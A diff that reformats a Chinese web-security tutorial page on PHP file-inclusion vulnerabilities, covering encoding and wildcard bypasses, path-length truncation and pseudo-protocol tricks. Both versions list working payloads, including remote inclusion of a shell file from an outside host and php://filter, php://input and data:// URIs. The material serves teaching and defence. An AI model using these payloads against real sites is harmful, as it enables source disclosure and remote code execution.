@@ -3,7 +3,6 @@
 
 基础
 ----------------------------------------
-
 常见的文件包含漏洞的形式为 ``<?php include("inc/" . $_GET['file']); ?>``
 
 考虑常用的几种包含方式为
@@ -25,7 +24,6 @@ url编码绕过
 
 特殊字符绕过
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
 - 某些情况下，读文件支持使用Shell通配符，如 ``?`` ``*`` 等
 - url中 使用 ``?`` ``#`` 可能会影响include包含的结果
 - 某些情况下，unicode编码不同但是字形相近的字符有同一个效果
@@ -39,27 +37,21 @@ url编码绕过
 
 Windows上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为259个bytes。
 
-msdn定义```#define MAX_PATH 260```，第260个字符为字符串结尾的```\0```
-
-linux可以用getconf来判断文件名长度限制和文件路径长度限制
+msdn定义 ``#define MAX_PATH 260``，其中第260个字符为字符串结尾的 ``\0`` ，而linux可以用getconf来判断文件名长度限制和文件路径长度限制。
 
 获取最长文件路径长度：getconf PATH_MAX /root 得到4096
 获取最长文件名：getconf NAME_MAX /root 得到255
 
-那么在长度有限的时候，```././././``` (n个) 的形式就可以通过这个把路径爆掉
+那么在长度有限的时候，``././././`` (n个) 的形式就可以通过这个把路径爆掉
 
 在php代码包含中，这种绕过方式要求php版本 < php 5.2.8
 
 伪协议绕过
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-- 远程包含: 要求 ``allow_url_fopen=On`` and ``allow_url_include=On`` ， payload为 ``?file=[http|https|ftp]://websec.wordpress.com/shell.txt``
-
-- PHP INPUT: 把payload放在POST参数中作为包含的文件，要求 ``allow_url_include=On`` ，payload为 ``?file=php://input``
-
-- BASE64: 使用Base64伪协议读取文件，payload为 ``?file=php://filter/convert.base64-encode/resource=index.php``
-
-- DATA: 使用data伪协议读取文件，payload为 ``?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=`` 要求 ``allow_url_include=On``
+- 远程包含: 要求 ``allow_url_fopen=On`` 且 ``allow_url_include=On`` ， payload为 ``?file=[http|https|ftp]://websec.wordpress.com/shell.txt`` 的形式
+- PHP input: 把payload放在POST参数中作为包含的文件，要求 ``allow_url_include=On`` ，payload为 ``?file=php://input`` 的形式
+- Base64: 使用Base64伪协议读取文件，payload为 ``?file=php://filter/convert.base64-encode/resource=index.php`` 的形式
+- data: 使用data伪协议读取文件，payload为 ``?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=`` 的形式，要求 ``allow_url_include=On``
 
 参考链接
 ----------------------------------------
